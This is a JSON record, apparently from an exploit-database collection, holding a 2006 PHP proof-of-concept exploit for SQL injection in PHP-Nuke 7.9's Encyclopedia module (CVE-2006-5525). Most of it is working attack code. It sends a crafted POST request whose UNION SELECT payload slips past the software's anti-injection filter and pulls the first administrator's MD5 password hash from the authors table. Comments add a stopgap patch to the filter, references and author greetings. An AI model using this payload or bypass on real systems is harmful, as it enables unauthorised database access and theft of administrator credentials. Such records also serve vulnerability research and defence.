{
  "id": "2617",
  "title": "PHP-Nuke 7.9 - &#039;Encyclopedia&#039; SQL Injection",
  "cve": "CVE-2006-5525",
  "vuln_type": "sqli",
  "code": "<?\r\n/*\r\n\r\nNeo Security Team - Exploit made by Paisterist on 2006-10-22\r\nhttp://www.neosecurityteam.net\r\n\r\n*/\r\n\r\n$host=\"localhost\";\r\n$path=\"/phpnuke/\";\r\n$prefix=\"nuke_\";\r\n$port=\"80\";\r\n$fp = fsockopen($host, $port, $errno, $errstr, 30);\r\n$data=\"query=fooaa&eid=foo'/**/UNION SELECT pwd as title FROM $prefix_authors WHERE '1'='1\";\r\n\r\nif ($fp) {\r\n    $p=\"POST /phpnuke/modules.php?name=Encyclopedia&file=search HTTP/1.0\\r\\n\";\r\n    $p.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*\\r\\n\";\r\n    $p.=\"Referer: http://localhost/phpnuke/modules.php?name=Encyclopedia&file=search\\r\\n\";\r\n    $p.=\"Accept-Language: es-ar\\r\\n\";\r\n    $p.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    $p.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\";\r\n    $p.=\"Host: localhost\\r\\n\";\r\n    $p.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n    $p.=\"Pragma: no-cache\\r\\n\";\r\n    $p.=\"Connection: keep-alive\\r\\n\\r\\n\";\r\n    $p.=$data;\r\n   \r\n    fwrite($fp, $p);\r\n   \r\n    while (!feof($fp)) {\r\n        $content .= fread($fp, 4096);\r\n    }\r\n\r\n    preg_match(\"/([a-zA-Z0-9]{32})/\", $content, $matches);\r\n\r\n    print_r($matches);\r\n}\r\n\r\n// ==Real Proof of Concept exploit==\r\n\r\n// Whit this PoC code i get the md5 hash of the first admin (God) of the nuke_authors table.\r\n\r\n// - How to fix it? More information?\r\n// --------------------------------------------------------\r\n\r\n// You can found a patch on http://www.neosecurityteam.net/foro/\r\n\r\n// Also, you can modify the line 143 of mainfile.php, adding one more protection like:\r\n\r\n// ==[ mainfile.php old line (143) ]==========================\r\n// [...]\r\n// if (stripos_clone($postString,'%20union%20') OR stripos_clone($postString,'*/union/*') OR stripos_clone($postString,' union ') OR stripos_clone($postString_64,'%20union%20') OR stripos_clone($postString_64,'*/union/*') OR stripos_clone($postString_64,' union ') OR stripos_clone($postString_64,'+union+')) {\r\n// }\r\n// [...]\r\n// ==[ end mainfile.php ]=====================================\r\n\r\n// ==[ mainfile.php new line (143) ]==========================\r\n// [...]\r\n// if (stripos_clone($postString,'%20union%20') OR stripos_clone($postString,'*/union/*') OR stripos_clone($postString,' union ') OR stripos_clone($postString_64,'%20union%20') OR stripos_clone($postString_64,'*/union/*') OR stripos_clone($postString_64,' union ') OR stripos_clone($postString_64,'+union+') OR stripos_clone($postString_64,\r\n// '*/UNION ') OR stripos_clone($postString_64, ' UNION/*')) {\r\n// }\r\n// [...]\r\n// ==[ end mainfile.php ]=====================================\r\n\r\n// That's a momentary solution to the problem. I recommend to download the PHP Nuke 8.0 version in the next days... it is not\r\n// free at the moment.\r\n\r\n// - References\r\n// --------------------------------------------------------\r\n// http://www.neosecurityteam.net/index.php?action=advisories&id=27\r\n\r\n// - Credits\r\n// --------------------------------------------------------\r\n// Anti SQL Injection protection bypass by Paisterist -> paisterist.nst [at] gmail [dot] com\r\n// SQL Injection vulnerability in Encyclopedia module discovered by Paisterist -> paisterist.nst [at] gmail [dot] com\r\n// Proof of Concept exploit by Paisterist -> paisterist.nst [at] gmail [dot] com\r\n\r\n// [N]eo [S]ecurity [T]eam [NST] - http://www.neosecurityteam.net/\r\n\r\n\r\n// - Greets\r\n// --------------------------------------------------------\r\n// HaCkZaTaN\r\n// K4P0\r\n// Daemon21\r\n// Link\r\n// 0m3gA_x\r\n// LINUX\r\n// nitrous\r\n// m0rpheus\r\n// nikyt0x\r\n// KingMetal\r\n// Knightmare\r\n\r\n// Argentina, Colombia, Chile, Bolivia, Uruguay EXISTS!!\r\n\r\n// @@@@'''@@@@'@@@@@@@@@'@@@@@@@@@@@\r\n// '@@@@@''@@'@@@''''''''@@''@@@''@@\r\n// '@@'@@@@@@''@@@@@@ @@@'''''@@@\r\n// '@@'''@@@@'''''''''@@@''''@@@\r\n// @@@@''''@@'@@@@@@@@@@''''@@@@@\r\n?>\r\n\r\n# milw0rm.com [2006-10-22]",
  "url": "https://www.exploit-db.com/exploits/2617"
}